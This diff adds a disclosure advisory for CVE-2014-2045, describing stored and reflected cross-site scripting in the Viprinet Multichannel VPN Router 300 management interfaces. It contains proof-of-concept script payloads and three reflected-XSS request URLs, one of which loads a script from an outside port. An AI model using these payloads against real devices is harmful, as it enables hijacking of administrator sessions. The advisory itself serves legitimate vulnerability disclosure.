@@ -1,0 +1,50 @@
+
+Vulnerability title: Multiple Instances Of Cross-site Scripting In Viprinet Multichannel VPN Router 300
+
+CVE: CVE-2014-2045
+
+Vendor: Viprinet
+
+Product: Multichannel VPN Router 300
+
+Affected version: 2013070830/2013080900
+
+Fixed version: 	2014013131/2014020702
+Reported by: Tim Brown
+Details:
+
+	The data supplied to both the `old’ and `new’ web applications (the device has two web based management interfaces) was permanently stored and could be retrieved later by other users. This is a normal feature of many applications, however, in this instance the application failed to restrict the type of data that could be stored and also failed to sanitise it, meaning that it could not be safely rendered by the browser.
+
+	Stored cross-site scripting could be triggered by:
+
+	
+		Attempting to login with a username of `<script>alert(1)</script>’ (affects `old’ interface and results in post-authentication cross-site Scripting when a legitimate administrator views the realtime log)
+		Creating an account with a username of `<script>alert(1)</script>’ (affects both `old’ and `new’ interfaces once created)
+		Setting the device’s hostname to `<script>alert(1)</script>’  (affects `old’ interface once created)
+	
+
+	A number of locations were identified as being vulnerable to reflective attacks, including:
+
+
+http://<host>/exec?module=config&sessionid=<sessionid>&inspect=%3Cscript%20src=http://localhost:9090%3E%3C/script%3E
+http://<host>/exec?tool=atcommands&sessionid=<sessionid>&sourceobject=WANINTERFACELIST.OBJECT__0&module=configtools&commands=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+http://<host>/exec?tool=ping&sessionid=<sessionid>&sourceobject=WANINTERFACELIST.OBJECT__0&module=configtools&host=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&pingcount=3&databytes=56
+
+
+	The inclusion of session IDs in all URLs partially mitigates the reflective cross-site scripting but could itself be considered a vulnerability since it is included in referred headers and log files.
+
+	These are simply some examples of how this attack might be performed, and the it is believed that both the `old’ and `new’ web applications are systemically vulnerable to this.
+ 
+
+               
+Further details at:
+
+ https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-2045/
+
+
+
+Copyright:
+Copyright (c) Portcullis Computer Security Limited 2015, All rights reserved worldwide. Permission is hereby granted for the electronic redistribution of this information. It is not to be edited or altered in any way without the express written consent of Portcullis Computer Security Limited.
+
+Disclaimer:
+The information herein contained may change without notice. Use of this information constitutes acceptance for use in an AS IS condition. There are NO warranties, implied or otherwise, with regard to this information or its use. Any use of this information is at the user's risk. In no event shall the author/distributor (Portcullis Computer Security Limited) be held liable for any damages whatsoever arising out of or in connection with the use or spread of this information.
